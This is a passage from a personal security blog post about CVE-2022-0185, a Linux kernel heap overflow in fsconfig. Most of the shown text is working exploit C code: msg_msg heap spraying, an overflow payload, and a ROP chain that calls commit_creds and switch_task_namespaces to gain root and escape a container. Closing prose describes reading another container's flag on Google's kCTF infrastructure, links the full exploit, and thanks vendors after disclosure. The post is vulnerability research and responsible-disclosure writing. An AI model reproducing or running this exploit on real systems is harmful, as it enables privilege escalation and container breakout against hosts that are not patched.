    stuff_4k(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">16</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> targets[P_SPRAY] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};

    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">while</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (!ready)
    {
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; P_SPRAY; i++) 
        {
            </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memset</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buffer, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x41</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">+i, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buffer));
            targets[i] = make_queue(IPC_PRIVATE, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0666</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> | IPC_CREAT);
            send_msg(targets[i], message, size - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        }

        get_msg(targets[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">], recieved, size</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);

        </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// misaligned arb free attack</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
        fd = fsopen(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"ext4"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (fd &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">) 
        {
                </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"Opening"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
                </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">exit</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        }

        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">strcpy</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(pat, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">117</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i++) {
            fsconfig(fd, FSCONFIG_SET_STRING, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"\x00"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, pat, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        }
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[*] Done heap overflow"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

        </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> evil[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x40</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};
        </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *evil_ptr = (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *)evil;
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memset</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(evil, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x41</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        evil_ptr[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = next_target;
        evil_ptr[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = prev_target;
        evil_ptr[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">4</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = free_target;
        evil_ptr[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">5</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = make_sec_happy;

         </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// in case null bytes in addresses</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">strlen</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(evil) != </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">)
        {
            </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"unable to continue given heap addresses"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
            </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">exit</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        }

        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[*] Overflowing..."</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        fsconfig(fd, FSCONFIG_SET_STRING, evil, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"\x00"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"check heap to check preparedness for ignition"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

        stuff_4k(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">16</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; P_SPRAY; i++)
        {
            </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memset</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(recieved, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(recieved));
            </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// rely on error code to determine if we have found our target which we overflowed into</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
            </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> ret = get_msg_no_err(targets[i], recieved, size+</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x50</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
            </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (ret &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">)
            {
                ready = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
                ignition_target = i;
                </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">break</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
            }
        }

        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (!ready)
        {
            </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"nothing ready for ignition, trying again"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
            </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// re-stuff freelist and stabilize</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
            stuff_4k(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">16</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        }
    }

    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> overwrite[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x300</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memset</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(overwrite, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x41</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(overwrite));
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *overwrite_ptr = (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *)overwrite;

    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// redirect to "table" of stack pivots</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    overwrite_ptr[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = kmalloc_512 + </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x50</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> user_rflags, user_cs, user_ss, user_sp;
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">asm</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">volatile</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(
        <span class="hljs-string" style="color: #a31515;">"mov %0, %%cs\n"</span>
        <span class="hljs-string" style="color: #a31515;">"mov %1, %%ss\n"</span>
        <span class="hljs-string" style="color: #a31515;">"mov %2, %%rsp\n"</span>
        <span class="hljs-string" style="color: #a31515;">"pushfq\n"</span>
        <span class="hljs-string" style="color: #a31515;">"pop %3\n"</span>
        : <span class="hljs-string" style="color: #a31515;">"=r"</span> (user_cs), <span class="hljs-string" style="color: #a31515;">"=r"</span> (user_ss), <span class="hljs-string" style="color: #a31515;">"=r"</span> (user_sp), <span class="hljs-string" style="color: #a31515;">"=r"</span> (user_rflags)
    )</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> chain[] = 
    {
        pop_rdi,
        </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">,
        prepare_kernel_cred,
        pop_rsi,
        </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xbaadbabe</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">,
        cmov_rdi_rax_esi_nz_pop_rbp,
        </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xdeadbeef</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">,
        commit_creds,
        pop_rdi,
        </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">,
        find_task_by_vpid,
        pop_rsi,
        </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xbaadbabe</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">,
        cmov_rdi_rax_esi_nz_pop_rbp,
        </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xdeadbeef</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">,
        pop_rsi,
        init_nsproxy,
        switch_task_namespaces,
        kpti_trampoline,
        </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xdeadbeef</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">,
        </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xbaadf00d</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">,
        (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">)pwned,
        user_cs,
        user_rflags,
        user_sp &amp; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0xffffffffffffff00</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">,
        user_ss,
    };

    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memcpy</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(&amp;overwrite_ptr[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">2</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">], chain, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(chain));

    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; P_SPRAY; i++)
    {
        get_msg(targets[i], recieved, size</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, IPC_NOWAIT | MSG_NOERROR);
    }

    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// spray rop chain plus evil vtable ptr to overlap with pipe_buffer</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; ROP_SPRAY; i++)
    {
        send_msg(rop_msg_qid[i], overwrite, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x300</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    }

    deplete_512();
    deplete_4k();
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[*] Attempt at igniting ROP!"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// trigger</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; PIPES; i++)
    {
        close(pipefd[i][</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">]);
        close(pipefd[i][</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">]);
    }

}</span></p></div><p>To find the other container&#8217;s flag, I just bruteforced 
/proc/pid/root/flag/flag as the container&#8217;s pid will map to some other 
pid accessible from the root pid namespace. You can also just work with a
 root shell, but this is just more efficient for getting the flag. 
Google&#8217;s Kubernetes CTF infrastructure compromised! You can find the 
link to our final exploit here: <a href="https://github.com/Crusaders-of-Rust/CVE-2022-0185/blob/master/exploit_kctf.c">https://github.com/Crusaders-of-Rust/CVE-2022-0185/blob/master/exploit_kctf.c</a>.</p><p>
</p><p>All in all this was a really cool experience, finding a 0 day for the
 first time on a major project and exploiting it. I&#8217;d like to thank all 
the teammates I worked with above for our collaborative effort. I would 
also like to thank the security teams from both distros and Linux for 
being super responsive upon our disclosure, and Google for the generous 
reward. Feel free to ask me any questions about this writeup, or point 
out anything that is explained erroneously! Let&#8217;s see what other bugs my
 team and I can find this year, and hopefully we don&#8217;t hit another bug 
collision again.</p>
<div style='clear: both;'></div>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
Posted by
<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
<span itemprop='name'>willsroot</span>
</span>
</span>
<span class='post-timestamp'>
at
<meta content='https://www.willsroot.io/2022/01/cve-2022-0185.html' itemprop='url'/>
<a class='timestamp-link' href='https://www.willsroot.io/2022/01/cve-2022-0185.html' rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2022-01-25T09:00:00-08:00'>9:00&#8239;AM</abbr></a>
</span>
<span class='post-comment-link'>
</span>
<span class='post-icons'>
<span class='item-control blog-admin pid-1768080780'>
<a href='https://www.blogger.com/post-edit.g?blogID=8814147965526194982&postID=8508102479187046073&from=pencil' title='Edit Post'>
<img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
</span>
<div class='post-share-buttons goog-inline-block'>
<a class='goog-inline-block share-button sb-email' href='https://www.blogger.com/share-post.g?blogID=8814147965526194982&postID=8508102479187046073&target=email' target='_blank' title='Email This'><span class='share-button-link-text'>Email This</span></a><a class='goog-inline-block share-button sb-blog' href='https://www.blogger.com/share-post.g?blogID=8814147965526194982&postID=8508102479187046073&target=blog' onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target='_blank' title='BlogThis!'><span class='share-button-link-text'>BlogThis!</span></a><a class='goog-inline-block share-button sb-twitter' href='https://www.blogger.com/share-post.g?blogID=8814147965526194982&postID=8508102479187046073&target=twitter' target='_blank' title='Share to X'><span class='share-button-link-text'>Share to X</span></a><a class='goog-inline-block share-button sb-facebook' href='https://www.blogger.com/share-post.g?blogID=8814147965526194982&postID=8508102479187046073&target=facebook' onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target='_blank' title='Share to Facebook'><span class='share-button-link-text'>Share to Facebook</span></a><a class='goog-inline-block share-button sb-pinterest' href='https://www.blogger.com/share-post.g?blogID=8814147965526194982&postID=8508102479187046073&target=pinterest' target='_blank' title='Share to Pinterest'><span class='share-button-link-text'>Share to Pinterest</span></a>
</div>
</div>
<div class='post-footer-line post-footer-line-2'>
<span class='post-labels'>
</span>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
<div class='comments' id='comments'>
<a name='comments'></a>
<h4>13 comments:</h4>
<div class='comments-content'>
<script async='async' src='' type='text/javascript'></script>
<script type='text/javascript'>
    (function() {
      var items = null;
      var msgs = null;
      var config = {};

// <![CDATA[
      var cursor = null;
      if (items && items.length > 0) {
        cursor = parseInt(items[items.length - 1].timestamp) + 1;
      }

      var bodyFromEntry = function(entry) {
        var text = (entry &&
                    ((entry.content && entry.content.$t) ||
                     (entry.summary && entry.summary.$t))) ||
            '';
        if (entry && entry.gd$extendedProperty) {
          for (var k in entry.gd$extendedProperty) {
            if (entry.gd$extendedProperty[k].name == 'blogger.contentRemoved') {
              return '<span class="deleted-comment">' + text + '</span>';
            }
          }
        }
        return text;
      }

      var parse = function(data) {
        cursor = null;
        var comments = [];
        if (data && data.feed && data.feed.entry) {
          for (var i = 0, entry; entry = data.feed.entry[i]; i++) {
            var comment = {};
            // comment ID, parsed out of the original id format
            var id = /blog-(\d+).post-(\d+)/.exec(entry.id.$t);
            comment.id = id ? id[2] : null;
            comment.body = bodyFromEntry(entry);
            comment.timestamp = Date.parse(entry.published.$t) + '';
            if (entry.author && entry.author.constructor === Array) {
              var auth = entry.author[0];
              if (auth) {
                comment.author = {
                  name: (auth.name ? auth.name.$t : undefined),
                  profileUrl: (auth.uri ? auth.uri.$t : undefined),
                  avatarUrl: (auth.gd$image ? auth.gd$image.src : undefined)
                };
              }
            }
            if (entry.link) {
              if (entry.link[2]) {
                comment.link = comment.permalink = entry.link[2].href;
              }
              if (entry.link[3]) {
                var pid = /.*comments\/default\/(\d+)\?.*/.exec(entry.link[3].href);
                if (pid && pid[1]) {
                  comment.parentId = pid[1];
                }
              }
            }
            comment.deleteclass = 'item-control blog-admin';
            if (entry.gd$extendedProperty) {
              for (var k in entry.gd$extendedProperty) {
                if (entry.gd$extendedProperty[k].name == 'blogger.itemClass') {
                  comment.deleteclass += ' ' + entry.gd$extendedProperty[k].value;
                } else if (entry.gd$extendedProperty[k].name == 'blogger.displayTime') {
                  comment.displayTime = entry.gd$extendedProperty[k].value;
                }
              }
            }
            comments.push(comment);
          }
        }
        return comments;
      };

      var paginator = function(callback) {
        if (hasMore()) {
          var url = config.feed + '?alt=json&v=2&orderby=published&reverse=false&max-results=50';
          if (cursor) {
            url += '&published-min=' + new Date(cursor).toISOString();
          }
          window.bloggercomments = function(data) {
            var parsed = parse(data);
            cursor = parsed.length < 50 ? null
                : parseInt(parsed[parsed.length - 1].timestamp) + 1
            callback(parsed);
            window.bloggercomments = null;
          }
          url += '&callback=bloggercomments';
          var script = document.createElement('script');
          script.type = 'text/javascript';
          script.src = url;
          document.getElementsByTagName('head')[0].appendChild(script);
        }
      };
      var hasMore = function() {
        return !!cursor;
      };
      var getMeta = function(key, comment) {
        if ('iswriter' == key) {
          var matches = !!comment.author
              && comment.author.name == config.authorName
              && comment.author.profileUrl == config.authorUrl;
          return matches ? 'true' : '';
        } else if ('deletelink' == key) {
          return config.baseUri + '/delete-comment.g?blogID='
               + config.blogId + '&postID=' + comment.id;
        } else if ('deleteclass' == key) {
          return comment.deleteclass;
        }
        return '';
      };

      var replybox = null;
      var replyUrlParts = null;
      var replyParent = undefined;

      var onReply = function(commentId, domId) {
        if (replybox == null) {
          // lazily cache replybox, and adjust to suit this style:
          replybox = document.getElementById('comment-editor');
          if (replybox != null) {
            replybox.height = '250px';
            replybox.style.display = 'block';
            replyUrlParts = replybox.src.split('#');
          }
        }
        if (replybox && (commentId !== replyParent)) {
          replybox.src = '';
          document.getElementById(domId).insertBefore(replybox, null);
          replybox.src = replyUrlParts[0]
              + (commentId ? '&parentID=' + commentId : '')
              + '#' + replyUrlParts[1];
          replyParent = commentId;
        }
      };

      var hash = (window.location.hash || '#').substring(1);
      var startThread, targetComment;
      if (/^comment-form_/.test(hash)) {
        startThread = hash.substring('comment-form_'.length);
      } else if (/^c[0-9]+$/.test(hash)) {
        targetComment = hash.substring(1);
      }

      // Configure commenting API:
      var configJso = {
        'maxDepth': config.maxThreadDepth
      };
      var provider = {
        'id': config.postId,
        'data': items,
        'loadNext': paginator,
        'hasMore': hasMore,
        'getMeta': getMeta,
        'onReply': onReply,
        'rendered': true,
        'initComment': targetComment,
        'initReplyThread': startThread,
        'config': configJso,
        'messages': msgs
      };

      var render = function() {
        if (window.goog && window.goog.comments) {
          var holder = document.getElementById('comment-holder');
          window.goog.comments.render(holder, provider);
        }
      };

      // render now, or queue to render when library loads:
      if (window.goog && window.goog.comments) {
        render();
      } else {
        window.goog = window.goog || {};
        window.goog.comments = window.goog.comments || {};
        window.goog.comments.loadQueue = window.goog.comments.loadQueue || [];
        window.goog.comments.loadQueue.push(render);
      }
    })();
// ]]>
  </script>
<div id='comment-holder'>
